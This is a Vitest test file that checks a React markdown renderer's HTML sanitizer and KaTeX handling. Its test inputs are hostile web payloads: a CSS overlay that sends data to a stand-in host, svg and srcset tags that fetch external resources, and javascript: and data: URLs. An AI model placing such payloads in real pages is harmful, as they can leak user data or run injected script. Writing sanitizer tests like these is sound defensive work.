import { renderToStaticMarkup } from "react-dom/server";
import { beforeAll, describe, expect, it } from "vitest";
import StreamdownText, { loadMathPlugin } from "./StreamdownText";

/**
 * The Streamdown path uses the same strict schema as SmartText: rehype-katex
 * runs after the sanitizer, so raw html loses inline style and the KaTeX
 * markup is never filtered. URLs also pass react-markdown's transform.
 */
const render = (text: string) => renderToStaticMarkup(<StreamdownText text={text} />);

beforeAll(async () => {
  await loadMathPlugin();
});

describe("StreamdownText sanitizer", () => {
  it("drops inline style from raw html, so no overlay or background-image", () => {
    const html = render(
      'Hello <span style="position:fixed;inset:0;z-index:9999;background-image:url(https://evil.example/?d=secret)">x</span>',
    );
    expect(html).toContain(">x</span>");
    expect(html).not.toContain("style=");
    expect(html).not.toContain("position:fixed");
    expect(html).not.toContain("evil.example");
  });

  it("drops inline style and classes even when raw html imitates KaTeX markup", () => {
    const html = render(
      '<span class="katex"><span class="strut" style="background:url(https://evil.example/k.png)"></span></span>',
    );
    expect(html).not.toContain("url(");
    expect(html).not.toContain("evil.example");
    expect(html).not.toContain('class="katex"');
  });

  it("drops picture and source, whose srcset has no protocol check", () => {
    const html = render('<picture><source srcset="https://evil.example/x.png"></picture>');
    expect(html).not.toContain("<source");
    expect(html).not.toContain("srcset");
    expect(html).not.toContain("evil.example");
  });

  it("drops svg use, which can fetch an external document", () => {
    const html = render('<svg><use href="https://evil.example/s.svg#a"></use></svg>');
    expect(html).not.toContain("<use");
    expect(html).not.toContain("evil.example");
  });

  it("keeps the inline style KaTeX itself generates", () => {
    const html = render("$$\n\\frac{a}{b} \\tag{2}\n$$");
    expect(html).toContain('class="katex-display"');
    expect(html).toContain('class="katex-tag"');
    expect(html).toMatch(/style="height:[0-9.]+em/);
    expect(html).not.toContain("katex-error");
  });

  it("drops javascript and data URLs from markdown links and images", () => {
    const html = render(
      "[a](javascript:alert(1)) [b](data:text/html,<b>x</b>) ![c](data:image/png;base64,AAAA) [ok](https://esa.int)",
    );
    expect(html).not.toContain("javascript:");
    expect(html).not.toContain("data:");
    expect(html).toContain('href="https://esa.int"');
  });

  it("gives \\href and \\url in a formula no link", () => {
    const html = render("$\\href{javascript:alert(1)}{x}$ and $\\url{javascript:alert(2)}$");
    // KaTeX runs with `trust` off: both render as error text, never a link.
    expect(html).not.toContain("href=");
    expect(html).not.toMatch(/<a[\s>]/);
    expect(html).toContain("color:var(--color-danger-300)");
  });

  it("shows invalid LaTeX in the danger colour token", () => {
    const html = render("Broken $\\frac{a}$ here");
    expect(html).toMatch(/class="katex-error"[^>]*style="color:var\(--color-danger-300\)"/);
    expect(html).not.toContain("--color-muted-foreground");
  });
});
